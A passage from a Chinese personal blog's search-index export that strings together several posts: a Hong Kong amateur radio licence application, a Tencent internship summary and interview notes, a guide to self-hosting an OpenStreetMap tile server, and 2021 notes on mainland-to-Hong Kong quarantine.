所有的资料都可以在线提交扫描件。\n再填表的第二个工作日，我就收到了OFCA发来的邮件：\nDear NAME,\nThank you for your application for Amateur Station Licence (ASL) and Authority to Operate (ATO). Please be advised that your call sign is**\u0026ldquo;VR2/BA7LKC\u0026rdquo;**.\nPlease arrange payment. The licence fee is HK310 (ASL is HKD150 per year, ATO is HKD160 for 5 years).\nPayment can be made by cash, PPS, cheque, EPS or bank draft. For payment by cheque or bank draft, please make the crossed cheque or bank draft payable to \u0026ldquo;Office of the Communications Authority\u0026rdquo;. In case overseas bank draft is used, it must include any additional charges incurred by our local banks.\nOFCA不会分配新的呼号，而是根据规则直接在香港使用VR2/原呼号就可以了。\n随后在PPS上缴费或者亲临办公室缴费即可，办公室地址：\nOffice of the Communications Authority 26/F., Wu Chung House, 213 Queen\u0026rsquo;s Road East, Wanchai, Hong Kong.\n按照邮件的说法，在缴费之后，证书会在9个工作日内签发。\n进口无线电器材 参考 https://www.ofca.gov.hk/filemanager/ofca/common/electronic_services/info_note/I187_18_tc.pdf，从大陆携带无线电器材到香港需要申请进口许可证，申请的费用为150HKD。\n","permalink":"https://blog.sparktour.me/posts/2021/09/03/apply-asl-and-ato-in-hk/","summary":"\u003ch1 id=\"持有大陆无线电执照香港申請業餘電台牌照操作授權證明\"\u003e持有大陆无线电执照香港申請業餘電台牌照／操作授權證明\u003c/h1\u003e\n\u003cp\u003e根据香港通訊事務管理局的规定，持有「中華人民共和國工業和信息化部發出的業餘無線電台執照和由中國無綫電協會發出的業餘電台操作技術能力證明－業餘電台操作證書 （操作證明）」的人士可以\u003ca href=\"https://www.ofca.gov.hk/filemanager/ofca/sc/content_624/GN_3_2015c.pdf\"\u003e免试申请\u003c/a\u003e香港的業餘電台牌照／操作授權證明。而香港的操作授權證明也能被欧洲多个国家承认。\u003c/p\u003e","title":"持有大陆无线电执照香港申請業餘電台牌照和操作授權證明"},{"content":"腾讯实习小结：你走过的路都将会在未来发挥意想不到的作用 时间过得很快，本周已经是实习的第七周，实习的最后一周了。腾讯的实习让我认识到了许多不曾在校园内能够体验到的东西，比如学术界和工业界对技术运用的差异，大型企业的协作与分工，和同事间的关系等等。在写这篇文章时，我还是更希望继续回到学术界进行深造，因此我选择了放弃此次实习的转正考核。\n工作内容 我所在的部门是腾讯云的运营计算服务部中的计算技术中心。由于这个部门负责了腾讯云机房为大客户准备机器的运维，发布和排障。基于安全考虑，实习生只能查看，但不能对生产环境的配置做任何的修改和发布。因此，近两个月来，我在部门内所做的工作主要是学习并测试一些配置对于集群虚拟化性能的影响。其中我研究了虚拟化的相关知识，虚拟机网络收发包的完整流程与路径，IO产生的完整路径和内存的分配等内容。\n在同一个会议室内，还有其他来自区域支持（大客户服务），运维开发（开发）和生态支持（产品经理）部门的实习生，其中区域支持和运维开发的同学都表示，在第一周之后，他们也要参与一些生产环境的开发/客户服务的工作，尤其是区域支持的同学。如此看来，可能是因为技术运维的职位比较看重经验，并且容易出现运维事故，导师自然也不太敢让实习生直接操作生产环境了。不过换个角度说，由于技术运维经验越多越吃香，这可能是一个没那么具有「35岁危机」的岗位（部门里确实有不少同事都在35岁以上）。\n组织结构 腾讯的组织架构大致为“事业群-部门-中心-小组”的四级架构。每个小组由10名左右的员工组成，每个中心又包含了五个左右小组，而每个部门大概有十余个中心，加起来应该有数百名员工。在每个中心中，大家的分工都十分明确，只需解决分配到自己头上，同时是自己对应领域的问题即可。中心每周会进行一次会议，由各个方向的负责人向大家同步当周的进展，同时中心的组长也会对每位同事的发言进行一些讨论。 我的导师经常和我说，在这种会议上，考研的不只是大家的业务水平，还有大家的表达能力（即能在几分钟之内概括自己的工作，而且还需要让负责不同专项的同事能够听明白）。\n协作与技术栈 我所在的中心被归类为了“技术运营”，或者也可以成为“SRE”部门。相比于开发部门，中心内的同事只需要一个终端就能够完成大部分的运维工作。而对于需要批量更新机器组件，修复软件问题，探查可能的错误和日志等操作，则要通过统一的发布平台，向平台上上传操作脚本。在审核通过后，脚本会被发送至集群中的每一台服务器执行相应的任务。\n在后疫情时代，随着在线会议的逐渐被大家接受，位于不同片区之间的同事协作也变得十分简单。在出现需要多人解决和沟通的事件时，平台会自动将需要参与的同事拉进企业微信群，随后就是大家使用在线会议对问题进行沟通和修复，整个过程甚至不需要离开座位一步。至于协作工具上的问题，中心的代码平台大都已经转用git进行版本跟踪了。不仅如此，类似的协作架构也对出差或者在家办公的同事十分友好。不过随时都能开始办公，对运维部门来说可能更是一把双刃剑，毕竟没有人想在凌晨被自动拨打的报警电话和在线会议建立通知吵醒。\n学术界与工业界 做学术求新的态度和大公司求稳的态度是有所差异的。如腾讯这样的大公司，凡事涉及到生产环境的操作，均是以求稳为先的。即使学术界或工业界前沿拿出了新的改进方案，如果评估到方案会对目前的生产环境造成任何负面的影响，这项新技术都需要在仔细论证和完善之后才可实施。在所有的中心中，除了几个被冠以“实验室”名称的研究中心外，大多数的中心涉及到的技术和操作只是CRUD，也不会涉及到太多学术前沿的东西。同时在处理完成故障后，同事们的输出还是以总结问题，提出对应方案为主，而不会涉及到对逻辑进行创新性的改造——这些事物一般都会分配给开发完成。但这也并不意味着员工在入职之后就不再需要学习，随着模块的更新 ，模块对应的配置和故障处理方式都在不断变化，同事们也需要和学生一样，即时了解这些前沿知识。\n基础设施管理 和大学的行政水平相比，腾讯在管理方面做到了较高的水准。比如在互联网公司的基础服务——IT服务方面，企业内就拥有十分完整的问答知识库，只要有IT方面的问题，拨打服务电话后就会有工作人员上门进行维修。而在学校中，由于信息中心的沟通方式只有QQ群，且人手不足，响应较为缓慢，许多课题组被迫自行解决一些本该由信息中心解决的问题，耗费了许多本该用于科研产出的时间。\n饮食 比学校的伙食好了不止一个档次😂。\n实习生培养 实习生的导师们大都很忙，同时实习生在大多数时间下，由于座位紧张而无法直接与导师面对面沟通。因此，如果自己不主动去找导师，导师就基本没有空去关心你，主动提问和高效提问就相当重要了（可参考 提问的智慧）。不过平时我在对业务有问题时询问导师时，我的导师时会认真回答我相关的问题的（就是有时导师实在太忙了，可能会过了半个多小时才回我）。在这里我也想感谢我的导师在实习过程中详细的给我列出培养计划，每次提问也有问必答，给我的业务学习带来了非常大的帮助（不过由于组织架构似乎是高压线，这里也就只能匿名感谢了😂）。\n另一点笔者认为有改进空间的则是部门为实习生安排的学习内容：实习生由于权限和知识/业务水平等原因，不能对现网的环境进行任何更改，而且也没有办法接触到太多的案例。不过整个过程中都在学习知识，而无法得到在平台上的实践机会。从和我同期实习的TEG云架构平台部的同学处了解到，他们在实习完成之后，会被分配一个实践任务，来实践他们所学到的运维知识和体验公司内的发布系统。但如果没法实战公司内的这些运维和发布变更工具的话，可能整个学习过程就无法完整的向实习生体现出腾讯的特色了，换做去其他的互联网企业实习，一样可以学习类似的东西。（不过我的导师也十分诚恳，在最后一周我和他闲聊时提出这个建议之后，他很快就回复我和其他的几位实习生和新校招的同学，未来处理现网问题时，把实习生和新员工带上一起了解案例）。\n回顾 这两个月的实习除了形式上像是在工作，内容上更像是在导师的指引下，自学了几门计算机方面的课程并了解了大型互联网企业处理问题，开发组件的标准路径。如果在毕业后我选择从事互联网行业，那在本科中学习到的微电子方向的专业知识或许将不再能派上用场，那大学带给我的，更多的还是学习方法论上的进步，能让我能够从堆积如山的资料中，筛选出对目前工作最有需要的部分，并快速将其掌握。\n同时这次实习也让我对互联网行业有了更深入的看法。尽管互联网公司为本科毕业生提供的薪酬相当优渥，但归根结底，本科生进入公司之后所做的CRUD（增删查改）工作，或许本质上和蓝领工人在流水线上所做的工作没有太大的区别。而公司中真正具有创造性的工作大都集中在研究部门。为了能够在未来脱离CRUD，进入公司的研究部门，一个更高的学历是十分有必要的，这也是我坚定信息希望继续读研的一大原因。希望我能在未来完成更高层级的学业之后，再次回归公司，做更多的“创造性工作”。\n在导师在离开之前给我的评语中，相信其中有两句话也概括了他对一个优秀员工的期待：\n凡是进过你手的事情，都要能对它负责，想清楚想明白，有疑问及时寻求帮助。\n不能过于偏技术性思维，也要思考将事情做好是不是有不靠堆砌技术实现的方案。\n后记 在这封报告上交给负责实习学分认证的老师之后，老师回复邮件中的一句话令我感触颇深，便也记录在这里：\n其实即使你毕业后选择了互联网大厂，现在的微电子专业的学习也会是有用的。以我十几年的工作的感受，真的，你走过的路都将会在未来发挥意想不到的作用。\n晚上十点下班时的班车 「会议室工位」 还可以看看 腾讯实习初体验 | Sparktour\u0026rsquo;s ","permalink":"https://blog.sparktour.me/posts/2021/08/10/tencent-intern-conclusion/","summary":"\u003ch1 id=\"腾讯实习小结你走过的路都将会在未来发挥意想不到的作用\"\u003e腾讯实习小结：你走过的路都将会在未来发挥意想不到的作用\u003c/h1\u003e\n\u003cp\u003e时间过得很快，本周已经是实习的第七周，实习的最后一周了。腾讯的实习让我认识到了许多不曾在校园内能够体验到的东西，比如学术界和工业界对技术运用的差异，大型企业的协作与分工，和同事间的关系等等。在写这篇文章时，我还是更希望继续回到学术界进行深造，因此我选择了放弃此次实习的转正考核。\u003c/p\u003e","title":"腾讯实习小结：你走过的路都将会在未来发挥意想不到的作用"},{"content":"自建OpenStreetsmap地图瓦片服务 地图显示效果 迫于openstreetsmap官方的瓦片服务器（tile server）速度太慢，而提供矢量瓦片（vector tile）服务的mapbox和maptiler的免费额度太少，更新慢。笔者最近尝试基于tileserver-gl，openmaptiles和tilemaker等工具自建了一个openstreetsmap的地图瓦片服务器。\n数据准备 我们所需的地图数据有两种格式，分别为pbf和mbtiles。其中，mbtiles格式是可以直接被tileserver-gl使用的，而pbf格式需要转换为mbtiles之后才能被tileserver-gl读取。\nmbtiles 如果希望快速搭建地图服务器，我们可以直接在https://extract.bbbike.org/这个网站上选择自己想要的区域并下载。下载时格式选择MB Vector Tiles Openmaptiles即可。**但这样下载下来的mbtiles只有地标的name字段，其他的翻译全部丢失了。**如果不介意这一点，可以在下载完后直接跳到「服务搭建」一节。\nPBF 如果希望下载带有完整数据的PBF文件进行修改，我们可以在网站上选择下载PBF格式的地图，或者去 https://download.geofabrik.de/ 上按照国家下载PBF格式的地图。\n转换格式 转换格式可以用两个软件，分别是tilemaker和openmaptiles。tilemaker的转换速度很快，不过转换出的mbtiles地图还是有上一节提到的「丢失属性」的问题，而openmaptiler在属性保留这一方面做的很好，而且还能从wikidata里自动下载对应地点的翻译（可选），不过转换的速度很慢。\n根据笔者自己测试的转换速度比较，转换的是https://download.geofabrik.de/上下载的中国大陆地区地图，文件大小大约900M，用一台96C372G的机器进行转换。tilemaker转换用了大约半小时，而openmaptiler花了12个小时左右。转换完之后的mbtiles大小约3.5G。\n使用tilemaker转换 首先下载tilemaker的二进制文件，之后准备好输入的文件，进行转换即可，机器可能需要安装luajit，sqlite3，shapelib等依赖。：\n/root/build/tilemaker --input /data/asia.osm.pbf --output /data/asia.mbtiles --config /root/resources/config-openmaptiles.json --process /root/resources/process-openmaptiles.lua 其中，json配置文件和lua文件直接使用发行版自带的配置文件即可，ZOOM的值最大使用14即可，更大的值不会带来更多的细节。\n使用openmaptiles转换 参考openmaptiles的README进行转换即可，机器需要预装docker和docker-compose，具体依赖可以参考这里。首先clone repo，之后在目录中执行（以下的几步需要拉取若干个docker镜像，加起来大约有10G，加上处理的数据，需要在磁盘中至少预留30G的空间比较保险）：\n（可选）如果要拉取维基百科的数据，则需要给docker添加代理。在.env中添加：\nhttp_proxy: http://192.168.59.100:8118 https_proxy: http://192.168.59.100:8118 HTTP_PROXY: http://192.168.59.100:8118 HTTPS_PROXY: http://192.168.59.100:8118 （可选）如果PBF数据是从bbbike上切出来的，需要预处理一下数据的边界（mydata即下载下来的数据文件名）：\nmkdir -p data mv mydata.osm.pbf data/ make generate-bbox-file area=mydata ./quickstart.sh mydata 如果需要增大执行数据库操作和地图切割操作的线程，可以更改.env里的MAX_PARALLEL_PSQL和COPY_CONCURRENCY。\n初始化数据文件夹：\nmake 准备数据库：\nmake start-db 导入PBF的数据：\nmake import-data 导入边界数据：\nmake import-osm make import-borders （可选）\n导入维基百科的附加数据：\nmake import-wikidata 清理数据库：\nmake clean make make import-sql 生成地图边界：\nmake generate-bbox-file # compute data bbox -- not needed for the whole planet 生成mbtiles文件：\nmake generate-tiles # generate tiles 执行完成之后，在data文件夹下就能看到一个名为tiles.mbtiles的地图数据文件，复制出来即可。\n服务搭建 笔者自己的配置文件repo：https://github.com/sparkcyf/tileserver-gl-config\n将中文字体的repo（用于瓦片地图渲染中文）：https://github.com/klokantech/klokantech-gl-fonts.git ，将repo中的KlokanTech Noto Sans CJK Regular重命名成Noto Sans Regular，并放入下面提到的fonts文件夹。\n将前面的到的tiles.mbtiles地图数据文件放入相应的data文件夹。\n随后使用repo中的docker-compose文件拉起容器，注意修改配置路径为自己的路径：\nversion: \u0026#39;3.3\u0026#39; services: tileserver-gl: image: maptiler/tileserver-gl:latest build: . command: --public_url https://example.com/osm-tile/ --no-cors --config /config/config.json ports: - \u0026#34;58085:8080\u0026#34; volumes: - \u0026#39;/data/mirrors-zfs/cra-service/vector-tile-server/map:/data\u0026#39; - \u0026#39;/data/mirrors-zfs/cra-service/vector-tile-server/config:/config\u0026#39; - \u0026#39;/data/mirrors-zfs/cra-service/vector-tile-server/style/styles:/app/node_modules/tileserver-gl-styles/styles\u0026#39; - \u0026#39;/data/mirrors-zfs/cra-service/vector-tile-server/style/fonts:/app/node_modules/tileserver-gl-styles/fonts\u0026#39; docker compose中提到的styles，config等文件都已经放在了上面的repo中了。另外记得修改--public_url后面的值，以及docker暴露出来的端口。\n**如果修改了样式文件或配置文件，重启容器即可重载配置。**有关tileserver-gl的更多用法，可以参考这里：https://tileserver.readthedocs.io/en/latest/\n（可选）修改sprite 在部分的样式文件中，一些图标（比如麦当劳，肯德基，高速公路标志等）需要从外联的样式文件加载，可能会造成瓦片地图渲染缓慢。如果需要替换成本地文件或网络上的其他文件，可以修改样式json文件中的\u0026quot;sprite\u0026quot;一节。sprite文件的具体类型可以参考这个repo。\nsprite数据中的图标 全部配置完成之后，运行docker-compose up，等待镜像被拉起即可查看地图了。\n如果打开地图时发现地图是空的，有可能是因为你并没有下载地图对应位置的数据，这时修改url末尾的经纬度即可（下面的url中# 后面的那一串，分别是缩放级别/纬度/经度）：\nexample.com/osm-tile/styles/osm-street/#11.16/22.5429/114.0402 在其他地图中引用瓦片服务器 可以参考mapbox写的这个例子，更改style变量即可：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;initial-scale=1,maximum-scale=1,user-scalable=no\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.maptiler.com/mapbox-gl-js/v1.5.1/mapbox-gl.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link href=\u0026#34;https://cdn.maptiler.com/mapbox-gl-js/v1.5.1/mapbox-gl.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt; \u0026lt;link href=\u0026#34;/static/css/cloud_base.css?t=1627890485\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt; \u0026lt;style\u0026gt; #map {position: absolute; top: 0; right: 0; bottom: 0; left: 0;} \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;map\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;https://www.maptiler.com\u0026#34; style=\u0026#34;position:absolute;left:10px;bottom:10px;z-index:999;\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;https://api.maptiler.com/resources/logo.svg\u0026#34; alt=\u0026#34;MapTiler logo\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;p\u0026gt;\u0026lt;a href=\u0026#34;https://www.maptiler.com/copyright/\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026amp;copy; MapTiler\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;https://www.openstreetmap.org/copyright\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026amp;copy; OpenStreetMap contributors\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;script\u0026gt; // You can remove the following line if you don\u0026#39;t need support for RTL (right-to-left) labels: mapboxgl.setRTLTextPlugin(\u0026#39;https://cdn.maptiler.com/mapbox-gl-js/plugins/mapbox-gl-rtl-text/v0.1.2/mapbox-gl-rtl-text.js\u0026#39;); var map = new mapboxgl.Map({ container: \u0026#39;map\u0026#39;, style: \u0026#39;https://example.com/path/styles/your-style/style.json\u0026#39;, center: [113.99548, 22.60003], zoom: 15.92 }); map.addControl(new MapboxLanguage({ defaultLanguage: \u0026#39;en\u0026#39; })); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; https://github.com/systemed/tilemaker/issues/187\n参考文档 https://blog.csdn.net/fbvukn/article/details/109072579 https://stackoverflow.com/questions/65849406/is-there-a-way-to-generate-a-mbtiles-file-from-osm-pbf-file https://blog.kleunen.nl/blog/tilemaker-generate-map （如何转换PBF到mbtiles） https://yasoob.me/posts/custom-map-with-tileserver-gl/ （如何配置tileserver-gl的config.json） ","permalink":"https://blog.sparktour.me/posts/2021/08/03/self-host-openstreetmap-tiles-server/","summary":"\u003ch1 id=\"自建openstreetsmap地图瓦片服务\"\u003e自建OpenStreetsmap地图瓦片服务\u003c/h1\u003e\n\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2021/self-host-openstreetmap-tiles-server/banner.jpg\" alt=\"地图显示效果\"  /\u003e\n    \u003cfigcaption\u003e地图显示效果\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e\n\u003cp\u003e迫于openstreetsmap官方的瓦片服务器（tile server）速度太慢，而提供矢量瓦片（vector tile）服务的mapbox和maptiler的免费额度太少，更新慢。笔者最近尝试基于tileserver-gl，openmaptiles和tilemaker等工具自建了一个openstreetsmap的地图瓦片服务器。\u003c/p\u003e","title":"自建OpenStreetmap地图瓦片服务"},{"content":"中国大陆赴港隔离备忘录 本文为个人搜集到的中国大陆赴港隔离信息的整合和备忘，文章内容写于2021年7月末，未来的隔离和入境政策可能随疫情更改，本文仅供参考。\n本文中包含了Google Maps的嵌入地图，可能需要使用代理才能访问。\n隔离政策 根据回港易的说明：\n我持有新簽發的入境簽證/進入許可/前往港澳通行證（俗稱「單程證」），並準備首次以居民身份進入香港特區，我可以藉回港易計劃來港而無須接受14天強制檢疫的安排嗎？ 由於你並未正式取得香港居民身份，並不符合回港易計劃的條件，因此你並不可以藉回港易計劃在來港時免去須接受14天強制檢疫的安排。有關是否符合資格申請回港易計劃的名額，見上文第2條問題。\n第一次前往香港学生并不适用于「回港易」政策。不过，如果已经完成完整的疫苗接种流程并过了14天，可以使用卫生署提供的这份PDF中提到的「『疫苗氣泡』下抵港人士最新登机与检疫安排」中提到的检疫政策，缩短隔离时间为7（隔离）+7（自我监察）。\n需要注意的是，在入境前14天內曾到中國內地屬暫不適用之風險地區。 （名單見：https://www.chp.gov.hk/files/pdf/at_risk_places_temporarily_inapplicable_underreturn2hk.pdf） 的人士不能因已完成接種疫苗而縮減強制檢疫期。（这份名单和回港易共用一份名单），个人推测这份名单的来源是国内的中高风险区所在的街道/区加上澳门要求的入境需要隔离14天的地区。\n疫苗互认 在此表格中的疫苗，皆可被港府承认：https://www.coronavirus.gov.hk/pdf/list_of_recognised_covid19_vaccines.pdf\n具体的列表如下（6月29日更新，国内能打到的标了下划线）：\nManufacturer 生產商 Common name(s) of the vaccine 常用疫苗名稱 Dose(s) required 所需針數 AstraZeneca / SK Bioscience 阿斯利康 / SK 生物科學 AstraZeneca COVID-19 Vaccine Vaxzevria COVID-19 Vaccine (ChAdOx1-S [recombinant]) AZD1222 2 Anhui Zhifei Longcom Biopharmaceutical 安徽智飛龍科馬生物製藥 重組新型冠狀病毒疫苗(CHO 细胞) 智克威得 ZF2001 3 BioNTech Comirnaty 復必泰 Tozinameran – COVID-19 mRNA vaccine (nucleoside modified) Pfizer-BioNTech COVID-19 Vaccine BNT162b2 2 CanSinoBIO 康希諾生物 Recombinant COVID-19 Vaccine (Adenovirus Type-5-Vectored Vaccine) 重組新型冠狀病毒疫苗(5 型腺病毒載體)) Convidecia 克威莎 1 Janssen 楊森公司 Janssen COVID-19 Vaccine 强生新冠疫苗 Janssen Ad26.COV2.S (COVID-19) vaccine 楊森 Ad26.COV2.S (COVID-19)疫苗 1 Moderna 莫德納 Moderna COVID‑19 Vaccine 莫德納 COVID-19 疫苗 mRNA-1273 vaccine 2 Serum Institute of India 印度血清研究所 Covishield ChAdOx1 nCoV-19 Corona Virus Vaccine (Recombinant) AZD1222 2 Sinopharm / Beijing Institute of Biological Products 國藥集團中國生物北京生物製品研究所1 COVID-19 Vaccine (Vero Cell), Inactivated 新型冠狀病毒滅活疫苗(Vero 細胞) BBIBP-CorV 眾愛可維 COVID-19-i 新冠疫苗(Vero 細胞) SARS-COV-2 Vaccine (Vero Cell), Inactivated 新型冠狀病毒滅活疫苗(Vero 細胞) COVID-19 Vaccine 新型冠狀病毒疫苗 2 Sinopharm / Wuhan Institute of Biological Products 國藥集團中國生物武漢生物製品研究所 COVID-19 Vaccine (Vero Cell), Inactivated 新型冠狀病毒滅活疫苗(Vero 細胞) WIBP-CorV 眾康可維 2 Sinovac 科興 CoronaVac 克爾來福 COVID-19 Vaccine (Vero Cell), Inactivated 新型冠狀病毒滅活疫苗 (Vero 細胞) 2 The Gamaleya National Center of Epidemiology and Microbiology 伽馬勒國家流行病學和微生物學研究中心 Sputnik V 2 Shenzhen Kangtai Biological Products 深圳康泰生物製品 SARS-COV-2 Vaccine (Vero Cell), Inactivated 新型冠狀病毒滅活疫苗 (Vero 細胞) 可維克 2 Institute of Medical Biology Chinese Academy of Medical Sciences 中國醫學科學院醫學生物學研究所 SARS-COV-2 Vaccine (Vero Cell), Inactivated 新型冠狀病毒滅活疫苗 (Vero 細胞) 科維福 2 有关回港易的传言（截止7月30日） 官方（指国有新闻媒体和香港政府新闻网）首次谈到来港易的时间为2021年4月：https://www.news.gov.hk/chi/2021/04/20210426/20210426_124708_233.html 随着2021年5月广东疫情升温，2021年6月，港府表示来港易变为「暂缓实施」：https://news.rthk.hk/rthk/ch/component/k2/1593984-20210602.htm 2021年7月初，经常有「知情人士」透露小道消息的HK01曾预言来港易会在7月初实施，但实际上并没有。 最近一次官方媒体提到来港易的新闻，分别是7月17日澎湃新闻报道的「香港特区政府驻沪办：推动交流，鼓励港青融入国家发展大局」，其中提到了「蔡亮（驻沪办主任）称，有关部门也计划推出“来港易”，希望实现在内地的非香港居民去香港也不需要隔离。」另一个是明报7月21日的新闻「港星氣泡三度延期 8月底再檢視 女子寧檢疫赴星見男友 闊別一年隔窗相見」，里面提到了旅遊界立法會議員姚思榮的采访，他表示「現在業界只寄望盡快與內地通關，估計8月有機會開展「來港易」，但初步會有配額，且會先針對探親、商務等」。 酒店预订 尽管从大陆前往香港的人士不能预定指定检疫酒店，但不是所有的普通酒店都允许隔离人士预定。以下是七月份查询到的一些酒店报价，供参考：\n在寻找酒店的过程中，没有想到的一点是这些酒店的入住体验大都是在小红书上找到的。如果希望寻找其他的酒店，可以尝试在小红书上使用「香港 隔离酒店」，「xx酒店 隔离」等关键字进行搜索。（另：小红书没有网页版，只有移动设备版本）\n晋逸精品酒店尖沙咀店 官网：https://www.butterflyhk.com/tc/butterfly-on-prat-tc\nGoogle Map：https://g.page/ButterflyonPrat\n高級客房，配備一張大床或兩張單人床（房間大小為210平方英尺）\n每間客房總計HKD 3,357.00（僅客房）（最多2人）\n豪華客房，配備一張大床或兩張單人床（房間大小為230平方英尺）\n每間客房總計HKD 3,830.00（僅限客房）（最多2人）\n以上房價需加收10％服務費\n通过邮件或官网预订，提前7天取消免费 也可以在代理商（比如携程，booking上定，价格大约可以打85折，但不能取消） 可以取外卖，取快递 Page148 官网：https://pagehotels.com/tc/page148/\nGoogle Map：https://g.page/Page148\n高級園景客房，配備一張大床（房間大小為190平方英尺）\n每間客房總計HKD 5,840（僅客房）（最多2人）\n以上房價需加收10％服務費\n通过邮件或官网预订，提前7天取消免费 也可以在代理商（比如携程，booking上定，价格大约可以打85折，但不能取消） 可以取外卖，取快递 旺角维景酒店 官网：http://www.metroparkhotelmongkok.com/index.asp?para=cn\nGoogle Map：https://goo.gl/maps/Bf89eEGTmBc9n7j99\n敝店接受進行7日隔離之訂房，標準房一間，一星期房價為HKD2,660.00或\n高級客房一間，一星期房價為HKD2,940.00，\n必須連續入住七天。\n房費已包含10%服務費，不包含三餐。房價和房態按酒店的房間供應情況而定。\n如提升房間至豪華間(約27平方米)，一星期房價只需HKD3,710.00。\n每天一位客人之早﹑午﹑晚三餐為HKD​180.00 (送餐服務)\n不管从任何渠道预定，都不接受退款。 过关后的交通 深圳湾口岸-香港市区 citymapper链接\ngoogle maps链接\n如果不打车，可以坐B2/B2P/B3X先到元朗/屯门/天水围，再进行转乘。如果八达通的钱不够，可以在深圳的地铁站充值机上使用微信或银行卡直接充值，深圳湾口岸似乎不提供充值的服务。\n如果打车（红色出租车），到达尖沙咀/红磡的价格大约为300HKD（实测300HKD+20元行李附加费）。\n酒店旁购物 过关 此节写于8月23日\n08:40 到达深圳湾口岸。此时门口的雨棚里的队伍已经转了一圈了，队伍的长度如下图，单向长度350m左右，队伍还折了一次。深圳这一侧还没进入出境大厅但需要排队的时候，都是没有空调的。\n出境排队 10:00 关口开放，队伍开始往前移动。\n11:30 排队到了出境大厅的门口。此时出境安检门的计数是1100左右（作为参考，这几天的每日过关人数是2500左右）。\n「往香港」 出境厅 队尾 队头 随后进入出境大厅，检查海关码，随后就是出境检查。出境大厅和海关都会安检一次行李。\n12:10 完成深圳一侧的出关程序，进入香港口岸区。香港口岸区有大约20个登记窗口，但从12:30到14:00就只剩大约5个窗口开着，队伍行进非常缓慢。\n14:20 到达登记窗口。在登记窗口，卫生署的人员会拨打你的电话，签发检疫令，分配样本瓶和一本检疫手册。\n之后工作人员会分配手环，激活手环，通过香港入境处之后就可以到达深圳湾公共运输交汇处了。\n深圳湾港方口岸出口 出租车参考费用 公共运输交汇处 新 香 港 （2018年时，笔者在此处也拍过一张类似的图： https://commons.wikimedia.org/wiki/File:Shenzhen_Bay_Bridge_To_HK_on_Shenzhen_Side.jpg） 15:10 乘上的士，到达Page148大概花费40分钟，出租车费用300+20HKD（香港出租车尾箱行李每件需要加收6HKD的附加费）。\n16:00 到达酒店。酒店旁边的 Market Place by Jasons 有水果饮料零食卖。\n酒店内景 酒店外景 Market Place by Jasons 从深圳出发到进入酒店，大约花费了8个小时。\n送样本瓶的路线（如果请亲友帮忙递送的话） 离Page148最近的收集点在「九龍公園 (拱廊)」（Kowloon Park Sports Centre, 22 Austin Rd, Tsim Sha Tsui, Hong Kong）。\n周边商店 via 微信公众号「Kel念间」\n","permalink":"https://blog.sparktour.me/posts/2021/07/31/mainland2hk-prepare-quarantine/","summary":"\u003ch1 id=\"中国大陆赴港隔离备忘录\"\u003e中国大陆赴港隔离备忘录\u003c/h1\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cstrong\u003e本文为个人搜集到的中国大陆赴港隔离信息的整合和备忘，文章内容写于2021年7月末，未来的隔离和入境政策可能随疫情更改，本文仅供参考。\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e本文中包含了Google Maps的嵌入地图，可能需要使用代理才能访问。\u003c/p\u003e","title":"中国大陆赴港隔离备忘录"},{"content":"腾讯实习初体验 说起来这个实习的来历还十分坎坷。在三月份的实习申请季，学院为我们推荐了华为海思的实习，可海思的实习笔试占比的绝大部分均是和verilog和验证有关的题目，而这正好触碰到了我知识的盲区😂（我们的课题组主要做的是生物与光学器件的仿真）。在被华为挂了之后，我「病急乱投医」地把阿里和腾讯都投了一遍。在选择岗位时，想到自己不是科班出身，只对运维方面的事务略有了解，于是就选择了腾讯的技术运营和阿里的基础架构开发。\n面试 也许是投简历太晚没有HC了，腾讯和阿里都是在五月中旬才把我的简历捞了出来。阿里的面试被分到了云数据库部门，面试时问了许多有关Java的开发知识。很遗憾也是由于我对Java没怎么准备，以及面试官似乎认为南科大是一所野鸡学校，二面之后就没了消息。当时甚至以为，这个暑假是不太可能找到实习了。\n在被阿里挂了之后，腾讯才发来了面试邀请（这时已经是五月中旬，腾讯的实习补录阶段了），从面试官那里得知我被分到了CSIG的云技术运营服务部门下的系统技术岗位。腾讯的一面是电话面试，二三和HR面是腾讯会议，不过面试官这一侧不开视频，只有面试者这一侧开。下面列举了一些每一面问到的问题：\n一面 自我介绍 谈到镜像站 询问debug经验 https://c.cra.moe/t/topic/66 顺便谈到了如何「对包」（答tcp flag，seq，checksum） Linux权限，docker容器，不同的RAID类型 LVM的架构 二面 开始之前先询问了自己对云计算有没有经验（答得一般，只说我自己有在云服务平台上搭建一些程序，可能可以说一下SAAS/PAAS这些平台的） 自我介绍-\u0026gt;镜像站 询问我们为什么需要用RAID60，有没有遇到过故障，遇到故障怎么办（答服务降级+热备） 询问同步文件/状态的方式（答rsync），询问有无比rsync更好的方式（这个没想出来） 询问对996的态度 三面 自我介绍-\u0026gt;asc超算比赛，如何监控功率和异常 校园巴士，具体的架构 如何监控集群，怎么保证不超过功率 RAID的一些实现方式，NFS 询问能够来实习多久 HR面 自我介绍-\u0026gt;镜像站，这次主动回答了自己经常涉及跟老师进行的「行政工作」，遂询问行政工作都是什么（拉通），怎么准备去说懂老师给镜像站开放公网的。 问了爱好，略微问了一下业余无线电的内容。 有没有让自己感觉到压力很大的事情。 导师允不允许实习（答导师随意） 